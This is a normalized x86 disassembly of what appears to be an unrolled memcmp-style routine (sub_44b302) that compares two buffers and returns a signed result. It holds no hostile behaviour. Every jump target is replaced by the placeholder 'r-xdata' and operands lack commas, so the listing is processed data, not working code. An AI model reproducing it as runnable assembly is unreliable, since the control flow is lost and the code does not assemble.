movzx eax [ edx - 0x9 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1 ]
movzx eax [ edx - 0x1 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x2 ]
movzx eax [ edx - 0x2 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx eax [ edx - 0x7 ]
movzx ecx [ esi - 0x7 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x8 ]
movzx eax [ edx - 0x8 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
mov eax [ esi + 0xc ]
cmp eax [ edx + 0xc ]
je r-xdata
movzx edi [ esi + 0x9 ]
movzx eax [ edx + 0x9 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x7 ]
movzx eax [ edx + 0x7 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0xc ]
sub edi eax
je r-xdata
movzx edi [ esi + 0xa ]
movzx eax [ edx + 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ edx + 0x10 ]
je r-xdata
movzx edi [ esi + 0xd ]
movzx eax [ edx + 0xd ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0xb ]
movzx eax [ edx + 0xb ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx eax [ edx + 0x10 ]
movzx edi [ esi + 0x10 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0xe ]
movzx eax [ edx + 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax [ edx + 0x14 ]
je r-xdata
movzx edi [ esi + 0x11 ]
movzx eax [ edx + 0x11 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0xf ]
movzx eax [ edx + 0xf ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x14 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x12 ]
movzx eax [ edx + 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax [ edx + 0x18 ]
je r-xdata
movzx edi [ esi + 0x15 ]
movzx eax [ edx + 0x15 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x13 ]
movzx eax [ edx + 0x13 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x18 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x16 ]
movzx eax [ edx + 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x1c ]
cmp eax [ edx + 0x1c ]
je r-xdata
movzx edi [ esi + 0x19 ]
movzx eax [ edx + 0x19 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x17 ]
movzx eax [ edx + 0x17 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x1c ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x1a ]
movzx eax [ edx + 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
push 0x20
pop ecx
sub ebx ecx
add esi ecx
add edx ecx
cmp ebx ecx
jae r-xdata
movzx edi [ esi + 0x1d ]
movzx eax [ edx + 0x1d ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x1b ]
movzx eax [ edx + 0x1b ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi + 0x1e ]
movzx eax [ edx + 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
movzx ecx [ esi + 0x1f ]
movzx eax [ edx + 0x1f ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
sub_44b302
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
cmp edi 0x20
jb r-xdata
add edx edi
add ecx edi
cmp edi 0x1f
ja r-xdata
mov eax [ edx ]
cmp eax [ ecx ]
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_44ca22 ]
mov eax ebx
movzx esi al
movzx eax [ ecx ]
sub esi eax
je r-xdata
mov eax [ edx - 0x1c ]
cmp eax [ ecx - 0x1c ]
je r-xdata
mov eax [ edx - 0x18 ]
cmp eax [ ecx - 0x18 ]
je r-xdata
mov eax [ edx - 0x14 ]
cmp eax [ ecx - 0x14 ]
je r-xdata
mov eax [ edx - 0x10 ]
cmp eax [ ecx - 0x10 ]
je r-xdata
mov eax [ edx - 0xc ]
cmp eax [ ecx - 0xc ]
je r-xdata
mov eax [ edx - 0x8 ]
cmp eax [ ecx - 0x8 ]
je r-xdata
mov eax [ edx - 0x4 ]
cmp eax [ ecx - 0x4 ]
je r-xdata
mov eax [ edx - 0x1d ]
cmp eax [ ecx - 0x1d ]
je r-xdata
mov eax [ edx - 0x19 ]
cmp eax [ ecx - 0x19 ]
je r-xdata
mov eax [ edx - 0x15 ]
cmp eax [ ecx - 0x15 ]
je r-xdata
mov eax [ edx - 0x11 ]
cmp eax [ ecx - 0x11 ]
je r-xdata
mov eax [ edx - 0xd ]
cmp eax [ ecx - 0xd ]
je r-xdata
mov eax [ edx - 0x9 ]
cmp eax [ ecx - 0x9 ]
je r-xdata
mov eax [ edx - 0x5 ]
cmp eax [ ecx - 0x5 ]
je r-xdata
movzx edx [ edx - 0x1 ]
movzx eax [ ecx - 0x1 ]
sub edx eax
je r-xdata
mov eax [ edx - 0x1e ]
cmp eax [ ecx - 0x1e ]
je r-xdata
mov eax [ edx - 0x1a ]
cmp eax [ ecx - 0x1a ]
je r-xdata
mov eax [ edx - 0x16 ]
cmp eax [ ecx - 0x16 ]
je r-xdata
mov eax [ edx - 0x12 ]
cmp eax [ ecx - 0x12 ]
je r-xdata
mov eax [ edx - 0xe ]
cmp eax [ ecx - 0xe ]
je r-xdata
mov eax [ edx - 0xa ]
cmp eax [ ecx - 0xa ]
je r-xdata
mov eax [ edx - 0x6 ]
cmp eax [ ecx - 0x6 ]
je r-xdata
mov ax [ edx - 0x2 ]
cmp ax [ ecx - 0x2 ]
je r-xdata
mov eax [ edx - 0x1f ]
cmp eax [ ecx - 0x1f ]
je r-xdata
mov eax [ edx - 0x1b ]
cmp eax [ ecx - 0x1b ]
je r-xdata
mov eax [ edx - 0x17 ]
cmp eax [ ecx - 0x17 ]
je r-xdata
mov eax [ edx - 0x13 ]
cmp eax [ ecx - 0x13 ]
je r-xdata
mov eax [ edx - 0xf ]
cmp eax [ ecx - 0xf ]
je r-xdata
mov eax [ edx - 0xb ]
cmp eax [ ecx - 0xb ]
je r-xdata
mov eax [ edx - 0x7 ]
cmp eax [ ecx - 0x7 ]
je r-xdata
movzx esi [ edx - 0x3 ]
movzx eax [ ecx - 0x3 ]
sub esi eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edx + 0x4 ]
cmp eax [ ecx + 0x4 ]
je r-xdata
movzx esi [ edx + 0x1 ]
movzx eax [ ecx + 0x1 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax ebx
movzx eax [ ecx - 0x1c ]
movzx esi [ edx - 0x1c ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x18 ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x14 ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x10 ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0xc ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x8 ]
sub esi eax
je r-xdata
test ebx ebx
jne r-xdata
movzx esi al
movzx eax [ ecx - 0x4 ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x1d ]
sub esi eax
je r-xdata
mov eax ebx
movzx eax [ ecx - 0x19 ]
movzx esi [ edx - 0x19 ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x15 ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x11 ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0xd ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x9 ]
sub esi eax
je r-xdata
test ebx ebx
je r-xdata
movzx esi al
movzx eax [ ecx - 0x5 ]
sub esi eax
je r-xdata
mov eax edx
jmp r-xdata
xor eax eax
test edx edx
setg al
lea edx [ eax * 2 - 0x1 ]
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x1e ]
sub esi eax
je r-xdata
mov eax ebx
movzx eax [ ecx - 0x1a ]
movzx esi [ edx - 0x1a ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x16 ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x12 ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0xe ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0xa ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x6 ]
sub esi eax
je r-xdata
mov eax ebx
jmp r-xdata
movzx esi al
movzx eax [ ecx - 0x2 ]
sub esi eax
je r-xdata
mov eax ebx
movzx eax [ ecx - 0x1f ]
movzx esi [ edx - 0x1f ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x1b ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x17 ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0x13 ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0xf ]
sub esi eax
je r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx - 0xb ]
sub esi eax
je r-xdata
test ebx ebx
jne r-xdata
movzx esi al
movzx eax [ ecx - 0x7 ]
sub esi eax
je r-xdata
movzx esi [ edx - 0x2 ]
movzx eax [ ecx - 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx + 0x4 ]
sub esi eax
je r-xdata
movzx esi [ edx + 0x2 ]
movzx eax [ ecx + 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x1b ]
movzx eax [ ecx - 0x1b ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x17 ]
movzx eax [ ecx - 0x17 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x13 ]
movzx eax [ ecx - 0x13 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xf ]
movzx eax [ ecx - 0xf ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xb ]
movzx eax [ ecx - 0xb ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x7 ]
movzx eax [ ecx - 0x7 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x3 ]
movzx eax [ ecx - 0x3 ]
sub esi eax
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx * 2 - 0x1 ]
test ebx ebx
jne r-xdata
movzx esi [ edx - 0x1c ]
movzx eax [ ecx - 0x1c ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x18 ]
movzx eax [ ecx - 0x18 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x14 ]
movzx eax [ ecx - 0x14 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x10 ]
movzx eax [ ecx - 0x10 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xc ]
movzx eax [ ecx - 0xc ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x8 ]
movzx eax [ ecx - 0x8 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x4 ]
movzx eax [ ecx - 0x4 ]
sub esi eax
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx * 2 - 0x1 ]
test ebx ebx
jne r-xdata
movzx esi [ edx - 0x1d ]
movzx eax [ ecx - 0x1d ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x19 ]
movzx eax [ ecx - 0x19 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x15 ]
movzx eax [ ecx - 0x15 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x11 ]
movzx eax [ ecx - 0x11 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xd ]
movzx eax [ ecx - 0xd ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x9 ]
movzx eax [ ecx - 0x9 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x5 ]
movzx eax [ ecx - 0x5 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx ebx [ edx - 0x1 ]
movzx eax [ ecx - 0x1 ]
sub ebx eax
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx * 2 - 0x1 ]
test ebx ebx
jne r-xdata
movzx esi [ edx - 0x1e ]
movzx eax [ ecx - 0x1e ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x1a ]
movzx eax [ ecx - 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x16 ]
movzx eax [ ecx - 0x16 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x12 ]
movzx eax [ ecx - 0x12 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xe ]
movzx eax [ ecx - 0xe ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xa ]
movzx eax [ ecx - 0xa ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x6 ]
movzx eax [ ecx - 0x6 ]
sub esi eax
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx * 2 - 0x1 ]
test ebx ebx
jne r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ edx + 0x8 ]
cmp eax [ ecx + 0x8 ]
je r-xdata
movzx esi [ edx + 0x5 ]
movzx eax [ ecx + 0x5 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx + 0x3 ]
movzx eax [ ecx + 0x3 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x1a ]
movzx eax [ ecx - 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x16 ]
movzx eax [ ecx - 0x16 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x12 ]
movzx eax [ ecx - 0x12 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xe ]
movzx eax [ ecx - 0xe ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xa ]
movzx eax [ ecx - 0xa ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x6 ]
movzx eax [ ecx - 0x6 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x2 ]
movzx eax [ ecx - 0x2 ]
sub esi eax
je r-xdata
